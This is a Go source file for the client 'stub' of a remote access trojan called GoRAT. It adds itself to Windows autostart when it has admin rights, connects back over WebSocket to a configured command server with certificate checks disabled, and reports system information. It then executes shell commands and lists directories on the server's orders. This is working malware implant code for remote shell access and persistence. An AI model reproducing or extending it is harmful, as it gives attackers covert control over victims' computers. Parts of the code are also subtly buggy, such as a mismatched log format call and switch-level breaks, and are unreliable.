package stub

import (
	"crypto/tls"
	"log"
	"time"

	"github.com/gorilla/websocket"
	"gorat/pkg/common"
)

// ServerAddress will be set by cmd/stub/main.go from the generated config.
var ServerAddress string

const (
	retryInterval = 5 * time.Second
)

// EnableAdminMode will be set by cmd/stub/main.go from the generated config.
var EnableAdminMode bool

// RunStubLogic is the main entry point for the stub's core operations.
// It handles connecting to the server and processing commands.
// This function is designed to be called by cmd/stub/main.go and can be restarted by a watchdog.
func RunStubLogic() {
	log.Println("Attempting to run stub logic...")

	if EnableAdminMode {
		log.Println("Admin mode is enabled. Performing admin-specific tasks.")
		// This function (IsAdmin) is only built on Windows.
		// On other OS, this call would ideally be guarded by build tags in the calling code too,
		// or IsAdmin would have non-Windows implementations returning false.
		// For now, assuming this whole stub is primarily for Windows, or admin features are Windows-specific.
		isAdmin := IsAdmin() // IsAdmin() is in autostart_windows.go
		if isAdmin {
			log.Println("Running with administrator privileges.")
			execPath, err := GetExecutablePath() // GetExecutablePath() is in autostart_windows.go
			if err != nil {
				log.Printf("Failed to get executable path: %v", err)
			} else {
				entryName := "GoRAT_Stub_Service" // Choose a suitable name
				log.Printf("Attempting to add to autostart: %s as %s", execPath, entryName)
				err := AddToAutostart(execPath, entryName) // AddToAutostart() is in autostart_windows.go
				if err != nil {
					log.Printf("Failed to add to autostart: %v", err)
				} else {
					log.Println("Successfully added to autostart.")
					// Note: "Run once" logic is not implemented here for simplicity in this step.
					// It will attempt to set the registry key every time if admin.
				}
			}
		} else {
			log.Println("Admin mode enabled but not running with admin privileges. Autostart skipped.")
		}
	} else {
		log.Println("Admin mode is not enabled.")
	}

	// ConnectToServer will loop internally for connection retries.
	// If ConnectToServer itself panics or has an unrecoverable exit for the whole stub,
	// the watchdog in main.go would restart RunStubLogic.
	ConnectToServer()
	log.Println("RunStubLogic finished a cycle (e.g. connection permanently failed after retries or unrecoverable error).")
}


// ConnectToServer attempts to connect to the WebSocket server, send system info,
// and then listen for commands. It will retry connection on failure indefinitely.
func ConnectToServer() {
	if ServerAddress == "" {
		// This should ideally not happen if the watchdog is also in main.go
		// and main.go sets ServerAddress.
		// If it does, it's a fatal setup error.
		log.Fatal("ServerAddress is not configured. Stub cannot start.")
	}

	dialer := websocket.DefaultDialer
	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true} // For self-signed certs

	for {
		log.Printf("Attempting to connect to %s", ServerAddress)
		conn, _, err := dialer.Dial(ServerAddress, nil)
		if err != nil {
			log.Printf("Failed to connect to server: %v. Retrying in %s...", err, ServerAddress, retryInterval)
			time.Sleep(retryInterval)
			continue
		}
		log.Println("Successfully connected to server:", conn.RemoteAddr())

		// Gather and send system information
		sysInfo := GetSystemInfo() // Defined in sysinfo.go
		sysInfoMsg := common.Message{
			Type:    "sysinfo_report",
			Payload: sysInfo,
		}

		err = conn.WriteJSON(sysInfoMsg)
		if err != nil {
			log.Printf("Error sending system info message: %v. Closing connection.", err)
			conn.Close() // Close connection if we can't even send initial info
			time.Sleep(retryInterval) // Wait before retrying
			continue
		}
		log.Printf("Sent system info: %+v", sysInfo)

		// Listen for commands from the server
		listenForCommands(conn) // This function will handle the read loop and connection closure

		log.Println("Disconnected from server. Retrying...")
		// The listenForCommands function will return when the connection is closed or an error occurs.
		// The loop will then proceed to retry.
		time.Sleep(retryInterval) // Wait before retrying connection
	}
}

// listenForCommands reads messages from the server.
func listenForCommands(conn *websocket.Conn) {
	defer conn.Close() // Ensure connection is closed when this function exits

	for {
		var msg common.Message
		err := conn.ReadJSON(&msg)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure, websocket.CloseNoStatusReceived) {
				log.Printf("Error reading message from server: %v", err)
			} else {
				log.Printf("Server connection closed: %v", err)
			}
			break // Exit loop on error or closure
		}

		log.Printf("Received message from server: Type=%s", msg.Type)

		switch msg.Type {
		case "shell_command":
			commandStr, ok := msg.Payload.(string)
			if !ok {
				log.Printf("Error: shell_command payload is not a string: %+v", msg.Payload)
				// Optionally send an error back to server
				errorMsg := common.Message{
					Type:    "shell_output", // Use same type for output/error for simplicity on client
					Payload: map[string]interface{}{"error": "Invalid command payload type from server"},
				}
				if err := conn.WriteJSON(errorMsg); err != nil {
					log.Printf("Error sending error message to server: %v", err)
					// If we can't even send an error, breaking might be best
					break 
				}
				continue // Wait for next command
			}

			output, err := HandleRemoteShellCommand(commandStr) // From handlers.go
			responsePayload := make(map[string]interface{})
			responsePayload["output"] = output
			if err != nil {
				responsePayload["error"] = err.Error()
			}

			shellResponseMsg := common.Message{
				Type:    "shell_output",
				Payload: responsePayload,
			}
			if err := conn.WriteJSON(shellResponseMsg); err != nil {
				log.Printf("Error sending shell_output to server: %v", err)
				break 
			}
		
		case "fm_list_dir_request":
			path, ok := msg.Payload.(string)
			if !ok {
				log.Printf("Error: fm_list_dir_request payload is not a string: %+v", msg.Payload)
				// Send error back to server
				errorMsg := common.Message{
					Type:    "fm_list_dir_response",
					Payload: map[string]interface{}{"error": "Invalid path payload type from server"},
				}
				if err := conn.WriteJSON(errorMsg); err != nil {
					log.Printf("Error sending error message for fm_list_dir_request to server: %v", err)
					break
				}
				continue 
			}

			files, err := HandleListDirectory(path) // From handlers.go
			responsePayload := make(map[string]interface{})
			responsePayload["files"] = files // Will be nil if error, or empty slice if dir is empty
			if err != nil {
				responsePayload["error"] = err.Error()
			}

			fmResponseMsg := common.Message{
				Type:    "fm_list_dir_response",
				Payload: responsePayload,
			}
			if err := conn.WriteJSON(fmResponseMsg); err != nil {
				log.Printf("Error sending fm_list_dir_response to server: %v", err)
				break 
			}

		default:
			log.Printf("Unknown command type from server: %s. Payload: %+v", msg.Type, msg.Payload)
			// Acknowledge receipt of unknown commands for debugging
			ackMsg := common.Message{
				Type:    "ack",
				Payload: "Unknown command type '" + msg.Type + "' received by stub.",
			}
			if err := conn.WriteJSON(ackMsg); err != nil {
				log.Printf("Error sending ack for unknown command to server: %v", err)
				break
			}
		}
	}
}
